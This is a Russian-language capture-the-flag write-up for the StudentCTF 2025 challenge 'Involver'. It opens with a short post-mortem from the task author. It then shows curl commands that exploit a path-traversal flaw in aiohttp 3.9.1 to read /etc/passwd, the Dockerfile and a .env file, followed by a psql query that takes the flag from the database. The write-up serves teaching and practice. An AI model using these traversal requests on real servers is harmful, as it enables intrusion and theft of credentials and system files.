## Involver

| Событие         | Название | Категория |
| :-------------- | -------- | --------- |
| StudentCTF 2025 | Involver | HTB       |

  
### Описание

> **🍕 Involver: The Calorie Conspiracy**  
> _Когда здоровое питание становится угрозой безопасности_
> 
> Вы - независимый исследователь кибербезопасности. К вам обратился бывший сотрудник компании "Involver", разрабатывающей популярное приложение для анализа калорий. Он утверждает, что система собирает больше данных, чем заявляет, а алгоритмы имеют критические уязвимости.

### Небольшой пост мортем о задании

Изначально таск был задуман, как простой HTB, в котором участнику не предстоит слишком долгих усилий, чтобы получить флаг, но после того как таск был написан, мысли были о том как этот таск смогут поломать "добросовестные участники", ведь кто-то да и попытается попав в базу данных удалить таблицы и с пользователями и с флагом. В связи с этим было принято решение разграничить пользователей и раздать необходимые права. При тестировании все было хорошо, и вход осуществлялся успешно, при деплое задания тоже не возникло никаких предпосылок. Но в процессе решения получилось так, что права на базу переставали влиять и приложение не могло выдать auth токен, чтобы попасть в главное меню. Это безусловно казалось странным, и при условии, что это была категория HTB многие могли предположить, что должен быть обход авторизации, но к сожалению для них это было не так. Данный факап не повлиял не решение задания, но подпортил впечатление о нем, таким образом хочется сказать спасибо участникам, что решали его не смотря на данный инцидент! 


### Решение
Из входных данных у пользователя была только http ссылка. Просканировав порты, картина выглядела следующим образом:
```
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
5432/tcp open  postgresql
8081/tcp open  blackice-icecap
8082/tcp open  blackice-alerts
8222/tcp open  unknown
```
По портам можно было понять, на каких портах висят остальные таски, но увидеть стандартный для postgres port 5432 довольно странно. Может быть где-то есть креды чтобы к ней подключиться? 
Открываем http ссылку, и панели разработчика во вкладке `network` можно посмотреть какие заголовки передает сервер, один из них `aiohttp 3.9.1`, но почему бы не воспользоваться nginx или apache? Вставляем этот заголовок в поиске и проверяем на известные уязвимости. Практически сразу попадается LFI уязвимость связанная именно с этой версией. Тестируем ...
```
curl -s --path-as-is "http://localhost:8081/static/../../../../../../../../../etc/passwd"
```
Есть! У нас есть произвольное чтение файлов. Следовательно надо понять, где находятся файлы приложения. Попробуем поискать системные или пользовательские файлы, успешным будет один из вариантов: ```
```
curl -s --path-as-is "http://localhost:8081/static/../../Dockerfile"
```
И у нас есть исходные коды приложения.
В одном из файлов видно что приложение подгружает enviroments, но /proc/self/enviroment недоступен. Может есть способ получить их еще как-нибудь? Пытаемся сделать файл enumeration из известных вариантов .env .enviroment .envs .enviroments и т. д. 
```
curl -s --path-as-is "http://localhost:8081/static/../../.env"
```
 
 Успешным оказывается такой перебор. И у нас есть доступ к базе данных. Подключаемся через консоль `psql` и видим две таблицы `users` и `secret`
```
SELECT * FROM secret; 
```

### Флаг

```
stctf{test_flag}
```
